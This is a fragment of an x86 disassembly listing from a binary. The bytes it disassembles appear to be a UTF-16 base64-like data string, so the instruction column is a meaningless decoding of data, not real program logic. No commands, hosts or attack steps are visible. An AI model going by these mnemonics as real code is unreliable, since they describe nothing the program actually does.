  409c35:	00 47 00             	add    %al,0x0(%edi)
  409c38:	53                   	push   %ebx
  409c39:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  409c3d:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  409c41:	00 4e 00             	add    %cl,0x0(%esi)
  409c44:	55                   	push   %ebp
  409c45:	00 49 00             	add    %cl,0x0(%ecx)
  409c48:	68 00 52 00 74       	push   $0x74005200
  409c4d:	00 66 00             	add    %ah,0x0(%esi)
  409c50:	4e                   	dec    %esi
  409c51:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  409c55:	00 50 00             	add    %dl,0x0(%eax)
  409c58:	61                   	popa
  409c59:	00 71 00             	add    %dh,0x0(%ecx)
  409c5c:	56                   	push   %esi
  409c5d:	00 4f 00             	add    %cl,0x0(%edi)
  409c60:	75 00                	jne    0x409c62
  409c62:	34 00                	xor    $0x0,%al
  409c64:	36 00 36             	add    %dh,%ss:(%esi)
  409c67:	00 31                	add    %dh,(%ecx)
  409c69:	00 68 00             	add    %ch,0x0(%eax)
  409c6c:	75 00                	jne    0x409c6e
  409c6e:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  409c71:	00 55 00             	add    %dl,0x0(%ebp)
  409c74:	30 00                	xor    %al,(%eax)
  409c76:	7a 00                	jp     0x409c78
  409c78:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409c7c:	69 00 68 00 67 00    	imul   $0x670068,(%eax),%eax
  409c82:	32 00                	xor    (%eax),%al
  409c84:	7a 00                	jp     0x409c86
  409c86:	46                   	inc    %esi
  409c87:	00 6d 00             	add    %ch,0x0(%ebp)
  409c8a:	69 00 77 00 39 00    	imul   $0x390077,(%eax),%eax
  409c90:	61                   	popa
  409c91:	00 65 00             	add    %ah,0x0(%ebp)
  409c94:	31 00                	xor    %eax,(%eax)
  409c96:	47                   	inc    %edi
  409c97:	00 43 00             	add    %al,0x0(%ebx)
  409c9a:	6a 00                	push   $0x0
  409c9c:	74 00                	je     0x409c9e
  409c9e:	4e                   	dec    %esi
  409c9f:	00 70 00             	add    %dh,0x0(%eax)
  409ca2:	74 00                	je     0x409ca4
  409ca4:	35 00 4d 00 55       	xor    $0x55004d00,%eax
  409ca9:	00 48 00             	add    %cl,0x0(%eax)
  409cac:	77 00                	ja     0x409cae
  409cae:	46                   	inc    %esi
  409caf:	00 32                	add    %dh,(%edx)
  409cb1:	00 66 00             	add    %ah,0x0(%esi)
  409cb4:	73 00                	jae    0x409cb6
  409cb6:	6a 00                	push   $0x0
  409cb8:	38 00                	cmp    %al,(%eax)
  409cba:	71 00                	jno    0x409cbc
  409cbc:	72 00                	jb     0x409cbe
  409cbe:	74 00                	je     0x409cc0
  409cc0:	2f                   	das
  409cc1:	00 69 00             	add    %ch,0x0(%ecx)
  409cc4:	49                   	dec    %ecx
  409cc5:	00 2b                	add    %ch,(%ebx)
  409cc7:	00 70 00             	add    %dh,0x0(%eax)
  409cca:	30 00                	xor    %al,(%eax)
  409ccc:	2b 00                	sub    (%eax),%eax
  409cce:	33 00                	xor    (%eax),%eax
  409cd0:	46                   	inc    %esi
  409cd1:	00 5a 00             	add    %bl,0x0(%edx)
  409cd4:	4b                   	dec    %ebx
  409cd5:	00 4f 00             	add    %cl,0x0(%edi)
  409cd8:	35 00 36 00 45       	xor    $0x45003600,%eax
  409cdd:	00 68 00             	add    %ch,0x0(%eax)
  409ce0:	78 00                	js     0x409ce2
  409ce2:	66 00 46 00          	data16 add %al,0x0(%esi)
  409ce6:	44                   	inc    %esp
  409ce7:	00 70 00             	add    %dh,0x0(%eax)
  409cea:	69 00 4f 00 6a 00    	imul   $0x6a004f,(%eax),%eax
  409cf0:	44                   	inc    %esp
  409cf1:	00 31                	add    %dh,(%ecx)
  409cf3:	00 37                	add    %dh,(%edi)
  409cf5:	00 4b 00             	add    %cl,0x0(%ebx)
  409cf8:	77 00                	ja     0x409cfa
  409cfa:	47                   	inc    %edi
  409cfb:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409cff:	00 57 00             	add    %dl,0x0(%edi)
  409d02:	50                   	push   %eax
  409d03:	00 75 00             	add    %dh,0x0(%ebp)
  409d06:	47                   	inc    %edi
  409d07:	00 46 00             	add    %al,0x0(%esi)
  409d0a:	30 00                	xor    %al,(%eax)
  409d0c:	32 00                	xor    (%eax),%al
  409d0e:	41                   	inc    %ecx
  409d0f:	00 4b 00             	add    %cl,0x0(%ebx)
  409d12:	39 00                	cmp    %eax,(%eax)
  409d14:	74 00                	je     0x409d16
  409d16:	35 00 4c 00 70       	xor    $0x70004c00,%eax
  409d1b:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  409d1f:	00 7a 00             	add    %bh,0x0(%edx)
  409d22:	69 00 72 00 6b 00    	imul   $0x6b0072,(%eax),%eax
  409d28:	6d                   	insl   (%dx),%es:(%edi)
  409d29:	00 63 00             	add    %ah,0x0(%ebx)
  409d2c:	4c                   	dec    %esp
  409d2d:	00 2b                	add    %ch,(%ebx)
  409d2f:	00 59 00             	add    %bl,0x0(%ecx)
  409d32:	51                   	push   %ecx
  409d33:	00 79 00             	add    %bh,0x0(%ecx)
  409d36:	4f                   	dec    %edi
  409d37:	00 7a 00             	add    %bh,0x0(%edx)
  409d3a:	30 00                	xor    %al,(%eax)
  409d3c:	56                   	push   %esi
  409d3d:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  409d41:	00 71 00             	add    %dh,0x0(%ecx)
  409d44:	30 00                	xor    %al,(%eax)
  409d46:	50                   	push   %eax
  409d47:	00 37                	add    %dh,(%edi)
  409d49:	00 67 00             	add    %ah,0x0(%edi)
  409d4c:	46                   	inc    %esi
  409d4d:	00 4f 00             	add    %cl,0x0(%edi)
  409d50:	4f                   	dec    %edi
  409d51:	00 2b                	add    %ch,(%ebx)
  409d53:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  409d57:	00 53 00             	add    %dl,0x0(%ebx)
  409d5a:	42                   	inc    %edx
  409d5b:	00 72 00             	add    %dh,0x0(%edx)
  409d5e:	43                   	inc    %ebx
  409d5f:	00 35 00 4f 00 67    	add    %dh,0x67004f00
  409d65:	00 43 00             	add    %al,0x0(%ebx)
  409d68:	79 00                	jns    0x409d6a
  409d6a:	56                   	push   %esi
  409d6b:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409d6f:	00 59 00             	add    %bl,0x0(%ecx)
  409d72:	41                   	inc    %ecx
  409d73:	00 62 00             	add    %ah,0x0(%edx)
  409d76:	65 00 35 00 42 00 4e 	add    %dh,%gs:0x4e004200
  409d7d:	00 56 00             	add    %dl,0x0(%esi)
  409d80:	45                   	inc    %ebp
  409d81:	00 7a 00             	add    %bh,0x0(%edx)
  409d84:	37                   	aaa
  409d85:	00 61 00             	add    %ah,0x0(%ecx)
  409d88:	70 00                	jo     0x409d8a
  409d8a:	4f                   	dec    %edi
  409d8b:	00 75 00             	add    %dh,0x0(%ebp)
  409d8e:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  409d92:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  409d96:	32 00                	xor    (%eax),%al
  409d98:	75 00                	jne    0x409d9a
  409d9a:	4c                   	dec    %esp
  409d9b:	00 45 00             	add    %al,0x0(%ebp)
  409d9e:	56                   	push   %esi
  409d9f:	00 6e 00             	add    %ch,0x0(%esi)
  409da2:	7a 00                	jp     0x409da4
  409da4:	6b 00 44             	imul   $0x44,(%eax),%eax
  409da7:	00 57 00             	add    %dl,0x0(%edi)
  409daa:	49                   	dec    %ecx
  409dab:	00 47 00             	add    %al,0x0(%edi)
  409dae:	30 00                	xor    %al,(%eax)
  409db0:	7a 00                	jp     0x409db2
  409db2:	39 00                	cmp    %eax,(%eax)
  409db4:	73 00                	jae    0x409db6
  409db6:	32 00                	xor    (%eax),%al
  409db8:	55                   	push   %ebp
  409db9:	00 70 00             	add    %dh,0x0(%eax)
  409dbc:	46                   	inc    %esi
  409dbd:	00 76 00             	add    %dh,0x0(%esi)
  409dc0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  409dc4:	31 00                	xor    %eax,(%eax)
  409dc6:	6f                   	outsl  %ds:(%esi),(%dx)
  409dc7:	00 39                	add    %bh,(%ecx)
  409dc9:	00 4e 00             	add    %cl,0x0(%esi)
  409dcc:	61                   	popa
  409dcd:	00 51 00             	add    %dl,0x0(%ecx)
  409dd0:	76 00                	jbe    0x409dd2
  409dd2:	6c                   	insb   (%dx),%es:(%edi)
  409dd3:	00 33                	add    %dh,(%ebx)
  409dd5:	00 4d 00             	add    %cl,0x0(%ebp)
  409dd8:	6a 00                	push   $0x0
  409dda:	61                   	popa
  409ddb:	00 51 00             	add    %dl,0x0(%ecx)
  409dde:	61                   	popa
  409ddf:	00 65 00             	add    %ah,0x0(%ebp)
  409de2:	62 00                	bound  %eax,(%eax)
  409de4:	4c                   	dec    %esp
  409de5:	00 46 00             	add    %al,0x0(%esi)
  409de8:	79 00                	jns    0x409dea
  409dea:	36 00 38             	add    %bh,%ss:(%eax)
  409ded:	00 39                	add    %bh,(%ecx)
  409def:	00 6d 00             	add    %ch,0x0(%ebp)
  409df2:	43                   	inc    %ebx
  409df3:	00 55 00             	add    %dl,0x0(%ebp)
  409df6:	31 00                	xor    %eax,(%eax)
  409df8:	57                   	push   %edi
  409df9:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  409dfd:	00 2f                	add    %ch,(%edi)
  409dff:	00 4f 00             	add    %cl,0x0(%edi)
  409e02:	72 00                	jb     0x409e04
  409e04:	6c                   	insb   (%dx),%es:(%edi)
  409e05:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  409e09:	00 6b 00             	add    %ch,0x0(%ebx)
  409e0c:	50                   	push   %eax
  409e0d:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  409e11:	00 61 00             	add    %ah,0x0(%ecx)
  409e14:	33 00                	xor    (%eax),%eax
  409e16:	70 00                	jo     0x409e18
  409e18:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  409e1b:	00 6a 00             	add    %ch,0x0(%edx)
  409e1e:	41                   	inc    %ecx
  409e1f:	00 57 00             	add    %dl,0x0(%edi)
  409e22:	70 00                	jo     0x409e24
  409e24:	68 00 2b 00 39       	push   $0x39002b00
  409e29:	00 50 00             	add    %dl,0x0(%eax)
  409e2c:	41                   	inc    %ecx
  409e2d:	00 55 00             	add    %dl,0x0(%ebp)
  409e30:	43                   	inc    %ebx
  409e31:	00 36                	add    %dh,(%esi)
  409e33:	00 30                	add    %dh,(%eax)
  409e35:	00 69 00             	add    %ch,0x0(%ecx)
  409e38:	34 00                	xor    $0x0,%al
  409e3a:	6b 00 50             	imul   $0x50,(%eax),%eax
  409e3d:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  409e41:	00 2f                	add    %ch,(%edi)
  409e43:	00 31                	add    %dh,(%ecx)
  409e45:	00 62 00             	add    %ah,0x0(%edx)
  409e48:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  409e4c:	63 00                	arpl   %eax,(%eax)
  409e4e:	41                   	inc    %ecx
  409e4f:	00 79 00             	add    %bh,0x0(%ecx)
  409e52:	71 00                	jno    0x409e54
  409e54:	66 00 54 00 65       	data16 add %dl,0x65(%eax,%eax,1)
  409e59:	00 2f                	add    %ch,(%edi)
  409e5b:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409e5f:	00 38                	add    %bh,(%eax)
  409e61:	00 71 00             	add    %dh,0x0(%ecx)
  409e64:	41                   	inc    %ecx
  409e65:	00 65 00             	add    %ah,0x0(%ebp)
  409e68:	6c                   	insb   (%dx),%es:(%edi)
  409e69:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  409e6d:	00 71 00             	add    %dh,0x0(%ecx)
  409e70:	79 00                	jns    0x409e72
  409e72:	43                   	inc    %ebx
  409e73:	00 5a 00             	add    %bl,0x0(%edx)
  409e76:	53                   	push   %ebx
  409e77:	00 47 00             	add    %al,0x0(%edi)
  409e7a:	56                   	push   %esi
  409e7b:	00 71 00             	add    %dh,0x0(%ecx)
  409e7e:	2f                   	das
  409e7f:	00 62 00             	add    %ah,0x0(%edx)
  409e82:	35 00 61 00 64       	xor    $0x64006100,%eax
  409e87:	00 65 00             	add    %ah,0x0(%ebp)
  409e8a:	52                   	push   %edx
  409e8b:	00 2b                	add    %ch,(%ebx)
  409e8d:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e90:	32 00                	xor    (%eax),%al
  409e92:	65 00 37             	add    %dh,%gs:(%edi)
  409e95:	00 51 00             	add    %dl,0x0(%ecx)
  409e98:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409e9c:	46                   	inc    %esi
  409e9d:	00 45 00             	add    %al,0x0(%ebp)
  409ea0:	6b 00 65             	imul   $0x65,(%eax),%eax
  409ea3:	00 48 00             	add    %cl,0x0(%eax)
  409ea6:	61                   	popa
  409ea7:	00 6b 00             	add    %ch,0x0(%ebx)
  409eaa:	59                   	pop    %ecx
  409eab:	00 76 00             	add    %dh,0x0(%esi)
  409eae:	62 00                	bound  %eax,(%eax)
  409eb0:	67 00 37             	add    %dh,(%bx)
  409eb3:	00 33                	add    %dh,(%ebx)
  409eb5:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  409eb9:	00 37                	add    %dh,(%edi)
  409ebb:	00 62 00             	add    %ah,0x0(%edx)
  409ebe:	37                   	aaa
  409ebf:	00 56 00             	add    %dl,0x0(%esi)
  409ec2:	66 00 78 00          	data16 add %bh,0x0(%eax)
  409ec6:	30 00                	xor    %al,(%eax)
  409ec8:	4b                   	dec    %ebx
  409ec9:	00 6b 00             	add    %ch,0x0(%ebx)
  409ecc:	4c                   	dec    %esp
  409ecd:	00 52 00             	add    %dl,0x0(%edx)
  409ed0:	70 00                	jo     0x409ed2
  409ed2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ed3:	00 4e 00             	add    %cl,0x0(%esi)
  409ed6:	2b 00                	sub    (%eax),%eax
  409ed8:	75 00                	jne    0x409eda
  409eda:	6a 00                	push   $0x0
  409edc:	76 00                	jbe    0x409ede
  409ede:	56                   	push   %esi
  409edf:	00 56 00             	add    %dl,0x0(%esi)
  409ee2:	33 00                	xor    (%eax),%eax
  409ee4:	79 00                	jns    0x409ee6
  409ee6:	34 00                	xor    $0x0,%al
  409ee8:	73 00                	jae    0x409eea
  409eea:	4a                   	dec    %edx
  409eeb:	00 55 00             	add    %dl,0x0(%ebp)
  409eee:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  409ef2:	35 00 48 00 74       	xor    $0x74004800,%eax
  409ef7:	00 4d 00             	add    %cl,0x0(%ebp)
  409efa:	71 00                	jno    0x409efc
  409efc:	2b 00                	sub    (%eax),%eax
  409efe:	62 00                	bound  %eax,(%eax)
  409f00:	37                   	aaa
  409f01:	00 4d 00             	add    %cl,0x0(%ebp)
  409f04:	2f                   	das
  409f05:	00 2b                	add    %ch,(%ebx)
  409f07:	00 46 00             	add    %al,0x0(%esi)
  409f0a:	41                   	inc    %ecx
  409f0b:	00 42 00             	add    %al,0x0(%edx)
  409f0e:	46                   	inc    %esi
  409f0f:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  409f13:	00 45 00             	add    %al,0x0(%ebp)
  409f16:	49                   	dec    %ecx
  409f17:	00 5a 00             	add    %bl,0x0(%edx)
  409f1a:	49                   	dec    %ecx
  409f1b:	00 47 00             	add    %al,0x0(%edi)
  409f1e:	61                   	popa
  409f1f:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  409f23:	00 59 00             	add    %bl,0x0(%ecx)
  409f26:	45                   	inc    %ebp
  409f27:	00 36                	add    %dh,(%esi)
  409f29:	00 2f                	add    %ch,(%edi)
  409f2b:	00 78 00             	add    %bh,0x0(%eax)
  409f2e:	2b 00                	sub    (%eax),%eax
  409f30:	53                   	push   %ebx
  409f31:	00 61 00             	add    %ah,0x0(%ecx)
  409f34:	39 00                	cmp    %eax,(%eax)
  409f36:	31 00                	xor    %eax,(%eax)
  409f38:	4a                   	dec    %edx
  409f39:	00 77 00             	add    %dh,0x0(%edi)
  409f3c:	69 00 44 00 36 00    	imul   $0x360044,(%eax),%eax
  409f42:	58                   	pop    %eax
  409f43:	00 53 00             	add    %dl,0x0(%ebx)
  409f46:	4b                   	dec    %ebx
  409f47:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  409f4b:	00 4e 00             	add    %cl,0x0(%esi)
  409f4e:	34 00                	xor    $0x0,%al
  409f50:	6d                   	insl   (%dx),%es:(%edi)
  409f51:	00 48 00             	add    %cl,0x0(%eax)
  409f54:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  409f58:	51                   	push   %ecx
  409f59:	00 61 00             	add    %ah,0x0(%ecx)
  409f5c:	4f                   	dec    %edi
  409f5d:	00 38                	add    %bh,(%eax)
  409f5f:	00 39                	add    %bh,(%ecx)
  409f61:	00 7a 00             	add    %bh,0x0(%edx)
  409f64:	56                   	push   %esi
  409f65:	00 51 00             	add    %dl,0x0(%ecx)
  409f68:	41                   	inc    %ecx
  409f69:	00 73 00             	add    %dh,0x0(%ebx)
  409f6c:	4c                   	dec    %esp
  409f6d:	00 32                	add    %dh,(%edx)
  409f6f:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  409f73:	00 73 00             	add    %dh,0x0(%ebx)
  409f76:	34 00                	xor    $0x0,%al
  409f78:	58                   	pop    %eax
  409f79:	00 73 00             	add    %dh,0x0(%ebx)
  409f7c:	58                   	pop    %eax
  409f7d:	00 66 00             	add    %ah,0x0(%esi)
  409f80:	48                   	dec    %eax
  409f81:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  409f85:	00 65 00             	add    %ah,0x0(%ebp)
  409f88:	6c                   	insb   (%dx),%es:(%edi)
  409f89:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  409f8d:	00 6f 00             	add    %ch,0x0(%edi)
  409f90:	39 00                	cmp    %eax,(%eax)
  409f92:	51                   	push   %ecx
  409f93:	00 6f 00             	add    %ch,0x0(%edi)
  409f96:	52                   	push   %edx
  409f97:	00 4b 00             	add    %cl,0x0(%ebx)
  409f9a:	42                   	inc    %edx
  409f9b:	00 56 00             	add    %dl,0x0(%esi)
  409f9e:	4c                   	dec    %esp
  409f9f:	00 5a 00             	add    %bl,0x0(%edx)
  409fa2:	46                   	inc    %esi
  409fa3:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  409fa7:	00 7a 00             	add    %bh,0x0(%edx)
  409faa:	53                   	push   %ebx
  409fab:	00 56 00             	add    %dl,0x0(%esi)
  409fae:	71 00                	jno    0x409fb0
  409fb0:	72 00                	jb     0x409fb2
  409fb2:	54                   	push   %esp
  409fb3:	00 51 00             	add    %dl,0x0(%ecx)
  409fb6:	34 00                	xor    $0x0,%al
  409fb8:	71 00                	jno    0x409fba
  409fba:	53                   	push   %ebx
  409fbb:	00 6f 00             	add    %ch,0x0(%edi)
  409fbe:	74 00                	je     0x409fc0
  409fc0:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  409fc4:	31 00                	xor    %eax,(%eax)
  409fc6:	50                   	push   %eax
  409fc7:	00 71 00             	add    %dh,0x0(%ecx)
  409fca:	2b 00                	sub    (%eax),%eax
  409fcc:	49                   	dec    %ecx
  409fcd:	00 66 00             	add    %ah,0x0(%esi)
  409fd0:	33 00                	xor    (%eax),%eax
  409fd2:	51                   	push   %ecx
  409fd3:	00 4b 00             	add    %cl,0x0(%ebx)
  409fd6:	4c                   	dec    %esp
  409fd7:	00 52 00             	add    %dl,0x0(%edx)
  409fda:	58                   	pop    %eax
  409fdb:	00 50 00             	add    %dl,0x0(%eax)
  409fde:	6b 00 57             	imul   $0x57,(%eax),%eax
  409fe1:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  409fe5:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  409fe9:	00 38                	add    %bh,(%eax)
  409feb:	00 45 00             	add    %al,0x0(%ebp)
  409fee:	69 00 61 00 37 00    	imul   $0x370061,(%eax),%eax
  409ff4:	4d                   	dec    %ebp
  409ff5:	00 68 00             	add    %ch,0x0(%eax)
  409ff8:	4a                   	dec    %edx
  409ff9:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  409ffd:	00 39                	add    %bh,(%ecx)
  409fff:	00 65 00             	add    %ah,0x0(%ebp)
  40a002:	6c                   	insb   (%dx),%es:(%edi)
  40a003:	00 61 00             	add    %ah,0x0(%ecx)
  40a006:	62 00                	bound  %eax,(%eax)
  40a008:	59                   	pop    %ecx
  40a009:	00 6b 00             	add    %ch,0x0(%ebx)
  40a00c:	68 00 46 00 67       	push   $0x67004600
  40a011:	00 41 00             	add    %al,0x0(%ecx)
  40a014:	51                   	push   %ecx
  40a015:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40a019:	00 75 00             	add    %dh,0x0(%ebp)
  40a01c:	59                   	pop    %ecx
  40a01d:	00 69 00             	add    %ch,0x0(%ecx)
  40a020:	49                   	dec    %ecx
  40a021:	00 33                	add    %dh,(%ebx)
  40a023:	00 46 00             	add    %al,0x0(%esi)
  40a026:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a02a:	62 00                	bound  %eax,(%eax)
  40a02c:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a030:	4b                   	dec    %ebx
  40a031:	00 55 00             	add    %dl,0x0(%ebp)
  40a034:	6c                   	insb   (%dx),%es:(%edi)
  40a035:	00 35 00 56 00 61    	add    %dh,0x61005600
  40a03b:	00 6a 00             	add    %ch,0x0(%edx)
  40a03e:	6b 00 48             	imul   $0x48,(%eax),%eax
  40a041:	00 43 00             	add    %al,0x0(%ebx)
  40a044:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40a048:	79 00                	jns    0x40a04a
  40a04a:	6c                   	insb   (%dx),%es:(%edi)
  40a04b:	00 48 00             	add    %cl,0x0(%eax)
  40a04e:	50                   	push   %eax
  40a04f:	00 57 00             	add    %dl,0x0(%edi)
  40a052:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40a056:	44                   	inc    %esp
  40a057:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a05b:	00 53 00             	add    %dl,0x0(%ebx)
  40a05e:	79 00                	jns    0x40a060
  40a060:	49                   	dec    %ecx
  40a061:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a065:	00 69 00             	add    %ch,0x0(%ecx)
  40a068:	31 00                	xor    %eax,(%eax)
  40a06a:	53                   	push   %ebx
  40a06b:	00 4a 00             	add    %cl,0x0(%edx)
  40a06e:	48                   	dec    %eax
  40a06f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a072:	5a                   	pop    %edx
  40a073:	00 5a 00             	add    %bl,0x0(%edx)
  40a076:	47                   	inc    %edi
  40a077:	00 49 00             	add    %cl,0x0(%ecx)
  40a07a:	46                   	inc    %esi
  40a07b:	00 58 00             	add    %bl,0x0(%eax)
  40a07e:	4b                   	dec    %ebx
  40a07f:	00 69 00             	add    %ch,0x0(%ecx)
  40a082:	4b                   	dec    %ebx
  40a083:	00 6b 00             	add    %ch,0x0(%ebx)
  40a086:	54                   	push   %esp
  40a087:	00 73 00             	add    %dh,0x0(%ebx)
  40a08a:	31 00                	xor    %eax,(%eax)
  40a08c:	79 00                	jns    0x40a08e
  40a08e:	69 00 76 00 66 00    	imul   $0x660076,(%eax),%eax
  40a094:	46                   	inc    %esi
  40a095:	00 66 00             	add    %ah,0x0(%esi)
  40a098:	55                   	push   %ebp
  40a099:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a09d:	00 61 00             	add    %ah,0x0(%ecx)
  40a0a0:	53                   	push   %ebx
  40a0a1:	00 52 00             	add    %dl,0x0(%edx)
  40a0a4:	71 00                	jno    0x40a0a6
  40a0a6:	4e                   	dec    %esi
  40a0a7:	00 42 00             	add    %al,0x0(%edx)
  40a0aa:	47                   	inc    %edi
  40a0ab:	00 39                	add    %bh,(%ecx)
  40a0ad:	00 6f 00             	add    %ch,0x0(%edi)
  40a0b0:	78 00                	js     0x40a0b2
  40a0b2:	6b 00 55             	imul   $0x55,(%eax),%eax
  40a0b5:	00 65 00             	add    %ah,0x0(%ebp)
  40a0b8:	75 00                	jne    0x40a0ba
  40a0ba:	62 00                	bound  %eax,(%eax)
  40a0bc:	37                   	aaa
  40a0bd:	00 79 00             	add    %bh,0x0(%ecx)
  40a0c0:	68 00 73 00 6b       	push   $0x6b007300
  40a0c5:	00 78 00             	add    %bh,0x0(%eax)
  40a0c8:	6b 00 77             	imul   $0x77,(%eax),%eax
  40a0cb:	00 33                	add    %dh,(%ebx)
  40a0cd:	00 2f                	add    %ch,(%edi)
  40a0cf:	00 32                	add    %dh,(%edx)
  40a0d1:	00 2b                	add    %ch,(%ebx)
  40a0d3:	00 57 00             	add    %dl,0x0(%edi)
  40a0d6:	41                   	inc    %ecx
  40a0d7:	00 39                	add    %bh,(%ecx)
  40a0d9:	00 70 00             	add    %dh,0x0(%eax)
  40a0dc:	49                   	dec    %ecx
  40a0dd:	00 5a 00             	add    %bl,0x0(%edx)
  40a0e0:	70 00                	jo     0x40a0e2
  40a0e2:	56                   	push   %esi
  40a0e3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0e6:	6d                   	insl   (%dx),%es:(%edi)
  40a0e7:	00 32                	add    %dh,(%edx)
  40a0e9:	00 4a 00             	add    %cl,0x0(%edx)
  40a0ec:	72 00                	jb     0x40a0ee
  40a0ee:	59                   	pop    %ecx
  40a0ef:	00 42 00             	add    %al,0x0(%edx)
  40a0f2:	46                   	inc    %esi
  40a0f3:	00 51 00             	add    %dl,0x0(%ecx)
  40a0f6:	56                   	push   %esi
  40a0f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a0fa:	42                   	inc    %edx
  40a0fb:	00 43 00             	add    %al,0x0(%ebx)
  40a0fe:	4c                   	dec    %esp
  40a0ff:	00 79 00             	add    %bh,0x0(%ecx)
  40a102:	73 00                	jae    0x40a104
  40a104:	45                   	inc    %ebp
  40a105:	00 78 00             	add    %bh,0x0(%eax)
  40a108:	6d                   	insl   (%dx),%es:(%edi)
  40a109:	00 4d 00             	add    %cl,0x0(%ebp)
  40a10c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a10d:	00 53 00             	add    %dl,0x0(%ebx)
  40a110:	7a 00                	jp     0x40a112
  40a112:	31 00                	xor    %eax,(%eax)
  40a114:	38 00                	cmp    %al,(%eax)
  40a116:	47                   	inc    %edi
  40a117:	00 50 00             	add    %dl,0x0(%eax)
  40a11a:	4c                   	dec    %esp
  40a11b:	00 76 00             	add    %dh,0x0(%esi)
  40a11e:	34 00                	xor    $0x0,%al
  40a120:	31 00                	xor    %eax,(%eax)
  40a122:	4d                   	dec    %ebp
  40a123:	00 7a 00             	add    %bh,0x0(%edx)
  40a126:	4f                   	dec    %edi
  40a127:	00 42 00             	add    %al,0x0(%edx)
  40a12a:	72 00                	jb     0x40a12c
  40a12c:	79 00                	jns    0x40a12e
  40a12e:	2b 00                	sub    (%eax),%eax
  40a130:	52                   	push   %edx
  40a131:	00 57 00             	add    %dl,0x0(%edi)
  40a134:	46                   	inc    %esi
  40a135:	00 6d 00             	add    %ch,0x0(%ebp)
  40a138:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40a13c:	79 00                	jns    0x40a13e
  40a13e:	45                   	inc    %ebp
  40a13f:	00 6a 00             	add    %ch,0x0(%edx)
  40a142:	48                   	dec    %eax
  40a143:	00 6b 00             	add    %ch,0x0(%ebx)
  40a146:	4e                   	dec    %esi
  40a147:	00 56 00             	add    %dl,0x0(%esi)
  40a14a:	49                   	dec    %ecx
  40a14b:	00 31                	add    %dh,(%ecx)
  40a14d:	00 31                	add    %dh,(%ecx)
  40a14f:	00 75 00             	add    %dh,0x0(%ebp)
  40a152:	51                   	push   %ecx
  40a153:	00 55 00             	add    %dl,0x0(%ebp)
  40a156:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a15a:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a15e:	62 00                	bound  %eax,(%eax)
  40a160:	38 00                	cmp    %al,(%eax)
  40a162:	74 00                	je     0x40a164
  40a164:	59                   	pop    %ecx
  40a165:	00 45 00             	add    %al,0x0(%ebp)
  40a168:	4e                   	dec    %esi
  40a169:	00 48 00             	add    %cl,0x0(%eax)
  40a16c:	77 00                	ja     0x40a16e
  40a16e:	4a                   	dec    %edx
  40a16f:	00 56 00             	add    %dl,0x0(%esi)
  40a172:	34 00                	xor    $0x0,%al
  40a174:	39 00                	cmp    %eax,(%eax)
  40a176:	79 00                	jns    0x40a178
  40a178:	45                   	inc    %ebp
  40a179:	00 56 00             	add    %dl,0x0(%esi)
  40a17c:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a180:	37                   	aaa
  40a181:	00 75 00             	add    %dh,0x0(%ebp)
  40a184:	4d                   	dec    %ebp
  40a185:	00 48 00             	add    %cl,0x0(%eax)
  40a188:	58                   	pop    %eax
  40a189:	00 72 00             	add    %dh,0x0(%edx)
  40a18c:	70 00                	jo     0x40a18e
  40a18e:	5a                   	pop    %edx
  40a18f:	00 6a 00             	add    %ch,0x0(%edx)
  40a192:	2b 00                	sub    (%eax),%eax
  40a194:	4e                   	dec    %esi
  40a195:	00 6a 00             	add    %ch,0x0(%edx)
  40a198:	49                   	dec    %ecx
  40a199:	00 45 00             	add    %al,0x0(%ebp)
  40a19c:	39 00                	cmp    %eax,(%eax)
  40a19e:	50                   	push   %eax
